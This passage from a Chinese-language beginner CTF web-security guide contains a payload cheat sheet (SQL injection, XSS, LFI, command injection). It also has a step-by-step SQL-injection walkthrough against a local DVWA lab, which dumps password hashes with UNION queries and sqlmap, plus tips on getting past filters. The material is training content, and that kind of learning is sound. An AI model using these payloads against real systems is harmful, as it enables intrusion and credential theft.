- 类型：
- 考点：

## 解题过程
1. 信息收集：
2. 漏洞确认：
3. 利用过程：
4. 拿到 flag：

## 知识点总结
- 
```

---

## 附录 A：OWASP Top 10:2025

| 编号 | 名称 |
|------|------|
| A01 | Broken Access Control（访问控制失效） |
| A02 | Security Misconfiguration（安全配置错误） |
| A03 | Software Supply Chain Failures（软件供应链失败） |
| A04 | Cryptographic Failures（加密失败） |
| A05 | Injection（注入） |
| A06 | Insecure Design（不安全设计） |
| A07 | Authentication Failures（认证失败） |
| A08 | Software or Data Integrity Failures（软件或数据完整性失败） |
| A09 | Security Logging and Alerting Failures（日志与告警失败） |
| A10 | Mishandling of Exceptional Conditions（异常条件处理不当） |

> 参考：<https://owasp.org/Top10/2025/>

## 附录 B：常用 payload 速查

```text
# SQL
' OR 1=1 -- -
' UNION SELECT 1,2,3 -- -
' AND extractvalue(1,concat(0x7e,database())) -- -

# XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# LFI
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# 命令执行
; id
| id
$(id)
`id`
cat${IFS}/flag
```

## 附录 C：参考资料

- OWASP Top 10:2025：<https://owasp.org/Top10/2025/>
- PortSwigger Web Security Academy：<https://portswigger.net/web-security>
- CTF Wiki Web：<https://ctf-wiki.org/web/>
- PHP 手册：<https://www.php.net/manual/zh/>
- PayloadsAllTheThings：<https://github.com/swisskyrepo/PayloadsAllTheThings>

---

> 📌 **最后一句：** Web 题的核心不是背 payload，而是理解“数据从哪来、到哪去、中间经过了什么检查”。把每个漏洞的输入输出路径画出来，你就已经超过大多数新手了。

---

## 附录 D：新手 14 天练习计划

| 天数 | 任务 | 目标 |
|------|------|------|
| 第 1 天 | 装 Burp、DVWA、sqli-labs | 能抓到第一个请求 |
| 第 2 天 | HTTP 基础、状态码、Cookie | 能看懂请求和响应 |
| 第 3 天 | DVWA SQLi Low | 手工 union 注入成功 |
| 第 4 天 | sqli-labs 1-10 | 熟悉数字/字符/报错注入 |
| 第 5 天 | sqli-labs 11-20 | 熟悉 POST/盲注 |
| 第 6 天 | DVWA XSS 三关 | 能弹窗、能偷 Cookie |
| 第 7 天 | DVWA 文件包含/上传 | 能包含日志、能传图片马 |
| 第 8 天 | DVWA 命令执行 | 能读 /etc/passwd |
| 第 9 天 | PortSwigger SQLi 实验 | 能独立完成 3 个 lab |
| 第 10 天 | PortSwigger XSS 实验 | 能独立完成 3 个 lab |
| 第 11 天 | SSRF/XXE 实验 | 理解协议与外部实体 |
| 第 12 天 | SSTI/反序列化 | 能跑通一个简单链 |
| 第 13 天 | JWT + 逻辑漏洞 | 能伪造 token、能越权 |
| 第 14 天 | BUUCTF Web 5 题 | 完整写 WP |

> 💡 每天不要贪多。做 1-2 题，把每一步为什么这么做写下来，比刷 20 题有用。

---

## 附录 E：完整演练：DVWA SQL 注入从 0 到 flag

### E.1 启动环境

```bash
docker run --rm -it -p 8081:80 vulnerables/web-dvwa
```

浏览器打开 `http://localhost:8081`，默认账号：

```text
admin / password
```

登录后点 **DVWA Security**，把安全级别设为 **Low**，再进 **SQL Injection**。

### E.2 正常请求

页面有一个输入框，提交 `1`，返回：

```text
ID: 1
First name: admin
Surname: admin
```

看 URL：

```text
http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit#
```

后端 SQL 大概是：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

### E.3 判断注入

输入：

```text
1'
```

如果报错：

```text
You have an error in your SQL syntax...
```

说明是字符型注入，单引号被拼进去了。

再输入：

```text
1' AND '1'='1
```

正常返回；输入：

```text
1' AND '1'='2
```

没有结果。确认布尔条件生效。

### E.4 注释掉后面的引号

```text
1' -- 
```

注意 `--` 后面要有一个空格。页面正常返回，说明注释成功。

### E.5 猜列数

```text
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
```

前两个正常，第三个报错，说明查询返回 **2 列**。

### E.6 找回显位

```text
1' UNION SELECT 1,2 -- 
```

页面显示 `1` 和 `2`，说明两列都会回显。把 `1` 换成函数：

```text
1' UNION SELECT database(),version() -- 
```

返回：

```text
数据库名：dvwa
版本：10.x.x-MariaDB
```

### E.7 查表

```text
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- 
```

返回 `guestbook`、`users`。

### E.8 查列

```text
1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- 
```

返回 `user_id`、`first_name`、`last_name`、`user`、`password`、`avatar` 等。

### E.9 拿数据

```text
1' UNION SELECT user,password FROM users -- 
```

返回：

```text
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

`5f4dcc...` 是 MD5，解出来是 `password`。

### E.10 用 sqlmap 验证

```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=你的session; security=low" \
  --batch --dbs
```

再 dump：

```bash
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

### E.11 你学到了什么

- 判断字符型/数字型。
- 注释符。
- `ORDER BY` 猜列数。
- `UNION SELECT` 找回显。
- `information_schema` 查表/列。
- 哈希识别与破解。
- sqlmap 只是加速，不是替代理解。

---

## 附录 F：常见报错与解决

| 现象 | 原因 | 解决 |
|------|------|------|
| Burp 抓不到包 | 浏览器没设代理 / HTTPS 证书没装 | 检查代理 127.0.0.1:8080，安装 CA 证书 |
| 页面 302 跳登录 | 没有有效 session | 先登录，再带 Cookie 测试 |
| sqlmap 说参数不可注入 | 参数不对/有 WAF/需要 Cookie | 手工确认注入点，加 `--cookie`、`--tamper` |
| XSS 不弹窗 | HttpOnly / CSP / 输出被编码 | 看响应源码，确认 payload 是否原样输出 |
| 文件上传 403 | 目录禁止执行/后缀拦截 | 换后缀、换 Content-Type、找其他上传点 |
| `php://filter` 输出为空 | 路径不对/文件不存在 | 先读 `index.php`，确认相对路径 |
| `php://input` 不执行 | `allow_url_include=Off` | 改用 `php://filter` 或 `data://` |
| JWT 改完无效 | 签名没算对/算法不匹配 | 用 jwt_tool 重签，确认 alg |
| 命令执行无回显 | 命令被过滤/无权限 | 用 `;id`、`$(id)`、外带 DNSLog |
| 反序列化没反应 | 类没加载/魔术方法不触发 | 看源码，确认入口和 POP 链 |

---

## 附录 G：术语表

| 术语 | 解释 |
|------|------|
| Payload | 发送给目标的数据/代码 |
| PoC | 证明漏洞存在的最小示例 |
| EXP | 利用漏洞的完整代码 |
| WAF | Web 应用防火墙 |
| RCE | 远程代码执行 |
| LFI/RFI | 本地/远程文件包含 |
| SSRF | 服务端请求伪造 |
| XXE | XML 外部实体注入 |
| SSTI | 服务端模板注入 |
| IDOR | 不安全的直接对象引用（越权） |
| JWT | JSON Web Token |
| CSRF | 跨站请求伪造 |
| CORS | 跨域资源共享 |
| CSP | 内容安全策略 |
| POP 链 | 反序列化中串联魔术方法的利用链 |
| Gadget | 可利用的代码片段 |
| Oracle | 能返回“成功/失败”的接口 |
| Blind | 盲注，没有直接回显 |
| Tamper | sqlmap 的绕过脚本 |
| Shell | 命令执行环境 |
